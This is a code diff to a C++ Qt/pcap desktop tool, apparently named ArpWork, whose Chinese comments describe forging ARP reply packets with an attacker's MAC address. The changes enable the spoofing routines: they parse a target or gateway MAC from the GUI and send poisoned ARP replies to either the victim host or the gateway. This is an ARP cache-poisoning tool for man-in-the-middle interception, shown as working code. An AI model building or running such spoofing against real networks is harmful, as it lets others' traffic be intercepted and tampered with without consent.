@@ -11,24 +11,36 @@ ArpWork::~ArpWork()
 
 using namespace std;
 
+uint8_t ASCII_To_Hex(uint8_t number)
+{
+
+    if (number >= '0' && number <= '9')
+        return (number - 0x30);
+
+    else if (number >= 'a' && number <= 'f')
+        return ((number - 'a') + 10);
+
+    else if (number >= 'A' && number <= 'F')
+        return ((number - 'A') + 10);
+
+    return (0);
+}
 
 int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHostMAC[6], u_char HostMAC[6])
 {
     //伪造ARP Relpy包
     //目标信息
     string DstIP = TargetHostIP;
-    u_char DstMAC[6] = { 0,0,0,0,0,0 }; //TargetHostMAC;
     //源信息
     string SrcIP = GateIP;
-    u_char SrcMAC[6] = { 0,0,0,0,0,0 }; //HostMAC;   //假MAC地址（攻击机MAC）
 
     eth_head eh;        //以太网头
     arp_head ah;        //ARP头
 
     for (int i = 0; i < 6; i++)
-        eh.destMAC.byte[i] = DstMAC[i];
+        eh.destMAC.byte[i] = TargetHostMAC[i];
     for (int i = 0; i < 6; i++)
-        eh.sourceMAC.byte[i] = SrcMAC[i];
+        eh.sourceMAC.byte[i] = HostMAC[i];
     eh.type = htons(0x0806);        //ARP类型
 
     ah.hardwareType = htons(0x0001);
@@ -64,18 +76,16 @@ int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6]
     //伪造ARP Relpy包
     //目标信息
     string DstIP = GateIP;
-    u_char DstMAC[6] = { 0,0,0,0,0,0 }; //GateMAC[6];
     //源信息
     string SrcIP = TargetHostIP;
-    u_char SrcMAC[6] = { 0,0,0,0,0,0 }; //HostMAC[6];   //假MAC地址（攻击机MAC）
 
     eth_head eh;        //以太网头
     arp_head ah;        //ARP头
 
     for (int i = 0; i < 6; i++)
-        eh.destMAC.byte[i] = DstMAC[i];
+        eh.destMAC.byte[i] = GateMAC[i];
     for (int i = 0; i < 6; i++)
-        eh.sourceMAC.byte[i] = SrcMAC[i];
+        eh.sourceMAC.byte[i] = HostMAC[i];
     eh.type = htons(0x0806);        //ARP类型
 
     ah.hardwareType = htons(0x0001);
@@ -108,7 +118,7 @@ int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6]
 
 void ArpWork::send()
 {
-    /*pcap_if_t* alldevs;
+    pcap_if_t* alldevs;
     pcap_if_t* d;
     char* tam = (char*)"rpcap://";
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -151,11 +161,71 @@ void ArpWork::send()
         pcap_freealldevs(alldevs);
         return;
     }
-    pcap_freealldevs(alldevs);*/
+
+    u_char GateMAC[6];
+    u_char TargetHostMAC[6] ;
+    u_char HostMAC[6] = { 0x00,0x50,0x56,0xC0,0x00,0x08 };
+
+    string TargetHostIP = ui.lineEdit->text().toStdString();
+    string GateIP = ui.lineEdit_2->text().toStdString();   
+
+    pcap_freealldevs(alldevs);
     ui.lineEdit->setText("1008611");
+
     //发送模式
-   // Gate(adhandle);
-   // Host(adhandle);
+    QString str1 = "Gate";
+    QString str2 = "Host";
+    QString type = ui.comboBox->currentText();
+
+    if (type == str1) {
+
+        QString TMAC = ui.lineEdit_5->text();           // 从文本编辑框中取出的QString
+        QByteArray letter = TMAC.toLatin1();	       // QString转化为QByteArray
+        char* TargetMAC = letter.data();            // QByteArray转化为char*
+
+        uint8_t MAC_Buffer[6];
+        uint8_t i;
+        uint8_t ch1;
+        uint8_t ch2;
+        char* p;
+        p = TargetMAC;
+        for (i = 0; i < 6; i++)
+        {
+            ch1 = *p++;
+            ch2 = *p++;
+            ch1 = ASCII_To_Hex(ch1);
+            ch2 = ASCII_To_Hex(ch2);
+            MAC_Buffer[i] = (ch1 << 0x04) | ch2;
+            TargetHostMAC[i] = (char)MAC_Buffer[i];
+        }
+
+        Gate(adhandle, TargetHostIP, GateIP, TargetHostMAC, HostMAC);
+
+    }
+    else if (type == str2) {
+
+        QString GMAC = ui.lineEdit_5->text();
+        QByteArray letter = GMAC.toLatin1();
+        char* GaMAC = letter.data();
+
+        uint8_t MAC_Buffer[6];
+        uint8_t i;
+        uint8_t ch1;
+        uint8_t ch2;
+        char* p;
+        p = GaMAC;
+        for (i = 0; i < 6; i++)
+        {
+            ch1 = *p++;
+            ch2 = *p++;
+            ch1 = ASCII_To_Hex(ch1);
+            ch2 = ASCII_To_Hex(ch2);
+            MAC_Buffer[i] = (ch1 << 0x04) | ch2;
+            GateMAC[i] = (char)MAC_Buffer[i];
+        }
+
+        Host(adhandle, TargetHostIP, GateIP, HostMAC, GateMAC);
+    }
 }
 
 void ArpWork::gethost() {
@@ -202,7 +272,7 @@ void ArpWork::gethost() {
             ui.plainTextEdit->setPlainText(NetName);
 
             char mac[128];
-            sprintf_s(mac, 18, "%02X-%02X-%02X-%02X-%02X-%02X",
+            sprintf_s(mac, 18, "%02X%02X%02X%02X%02X%02X",
                 pIpAdapterInfo->Address[0],
                 pIpAdapterInfo->Address[1],
                 pIpAdapterInfo->Address[2],
@@ -279,5 +349,4 @@ void ArpWork::getIP(){
 void ArpWork::stop()
 {
     ui.lineEdit_5->setText("##");
-    ui.lineEdit_3->setText("100221");
 }
